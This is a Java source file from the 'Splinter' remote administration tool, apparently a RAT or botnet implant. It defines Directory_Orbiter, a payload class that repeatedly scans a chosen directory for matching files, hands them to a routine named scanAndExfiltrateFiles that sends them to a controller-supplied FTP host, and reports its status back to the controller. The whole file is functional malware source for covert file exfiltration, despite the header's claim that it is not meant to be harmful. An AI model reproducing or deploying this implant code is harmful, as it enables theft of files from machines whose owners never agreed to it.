/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Implant.Payloads;

import Implant.Driver;
import Implant.Splinter_IMPLANT;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.util.ArrayList;
import javax.swing.Timer;

public class Directory_Orbiter extends Thread
  implements Runnable, ActionListener
{
  public static final String strMyClassName = "Directory_Orbiter";
  File fleOrbitDirectory = null;
  String strFileType = "*.*";
  boolean recurseSubDirectories = false;
  int millisecInterruptDelayInterval = 1000;
  String FTP_Address = "";
  int FTP_Port = 21;

  private boolean engageOrbiter = true;

  Timer tmrInterrupt = null;

  boolean continueInterrupt = true;

  boolean dismissInterrupt = false;

  Splinter_IMPLANT implant = null;

  ArrayList<File> alOrbitDirectoryListing = new ArrayList();
  ArrayList<String> alOrbitDirectoryLastMoodifiedEntries = new ArrayList();

  public Directory_Orbiter(File orbitDir, String fileType, boolean recurseSubFolders, int milliSecDelay, String controllerAddress, int controllerPort, Splinter_IMPLANT implant_ok_to_be_null)
  {
    this.fleOrbitDirectory = orbitDir;
    this.strFileType = fileType;
    this.recurseSubDirectories = recurseSubFolders;
    this.millisecInterruptDelayInterval = milliSecDelay;
    this.FTP_Address = controllerAddress;
    this.FTP_Port = controllerPort;
    this.implant = implant_ok_to_be_null;

    if ((this.strFileType == null) || (this.strFileType.trim().equals("")))
    {
      this.strFileType = "*.*";
    }

    if (this.millisecInterruptDelayInterval == -2)
    {
      this.engageOrbiter = false;
    }
    else if (this.millisecInterruptDelayInterval < 1000)
    {
      this.millisecInterruptDelayInterval = 1000;
    }

    if ((this.fleOrbitDirectory == null) || (!this.fleOrbitDirectory.exists()) || (this.strFileType == null) || (this.FTP_Address == null) || (this.FTP_Port < 1) || (this.FTP_Port > 65535))
    {
      this.continueInterrupt = false;
    }
  }

  public void run()
  {
    try
    {
      if (this.continueInterrupt)
      {
        String notification = "Commencing Orbiter Payload Location: " + this.fleOrbitDirectory.getCanonicalPath() + Driver.fileSeperator + this.strFileType + " Delay: " + this.millisecInterruptDelayInterval / 1000 + " secs " + " Recursively including Sub-directories in data extraction: " + this.recurseSubDirectories + " FTP Repository: " + this.FTP_Address + ":" + this.FTP_Port;

        if (!this.engageOrbiter)
        {
          notification = "Commencing Extraction Payload Location: " + this.fleOrbitDirectory.getCanonicalPath() + Driver.fileSeperator + this.strFileType + " Recursively including Sub-directories in data extraction: " + this.recurseSubDirectories + " FTP Repository: " + this.FTP_Address + ":" + this.FTP_Port;

          Driver.sop(notification);
          sendToController(notification);

          ExfiltrateFilesUnderDirectory.scanAndExfiltrateFiles(this.fleOrbitDirectory, this.strFileType, this.recurseSubDirectories, this.alOrbitDirectoryListing, null, this.implant, this.FTP_Address, this.FTP_Port, this.engageOrbiter);
        }
        else
        {
          Driver.sop(notification);
          sendToController(notification);

          this.tmrInterrupt = new Timer(this.millisecInterruptDelayInterval, this);
          this.tmrInterrupt.start();
        }

      }

    }
    catch (Exception e)
    {
      Driver.eop("run", "Directory_Orbiter", e, e.getLocalizedMessage(), false);
      this.continueInterrupt = false;
    }
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if (ae.getSource() == this.tmrInterrupt)
      {
        if (!this.continueInterrupt)
        {
          String kill = "Orbiter Kill command received.... killing this thread softly...";
          sendToController(kill);
          try
          {
            this.tmrInterrupt.stop();
          } catch (Exception localException1) {
          }
        }
        if (!this.dismissInterrupt)
        {
          this.dismissInterrupt = true;

          this.alOrbitDirectoryListing = ExfiltrateFilesUnderDirectory.scanAndExfiltrateFiles(this.fleOrbitDirectory, this.strFileType, this.recurseSubDirectories, this.alOrbitDirectoryListing, this.alOrbitDirectoryLastMoodifiedEntries, this.implant, this.FTP_Address, this.FTP_Port, this.engageOrbiter);

          if (this.alOrbitDirectoryListing != null)
          {
            this.alOrbitDirectoryLastMoodifiedEntries.clear();

            for (int i = 0; i < this.alOrbitDirectoryListing.size(); i++)
            {
            	alOrbitDirectoryLastMoodifiedEntries.add(""+alOrbitDirectoryListing.get(i).lastModified());
            }

          }

          if (this.alOrbitDirectoryListing == null)
          {
            Driver.sop("Directory is no longer valid... I will continue to orbit incase it is re-created again or until user issues termination command\n");
          }

          this.dismissInterrupt = false;
        }

      }

    }
    catch (Exception e)
    {
      Driver.eop("AE", "Directory_Orbiter", e, e.getLocalizedMessage(), false);
    }
  }

  public boolean sendToController(String strToSend)
  {
    try
    {
      if (this.implant != null)
      {
        this.implant.sendToController(strToSend, false, false);
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendToController", "Directory_Orbiter", e, e.getLocalizedMessage(), false);
    }

    return false;
  }
}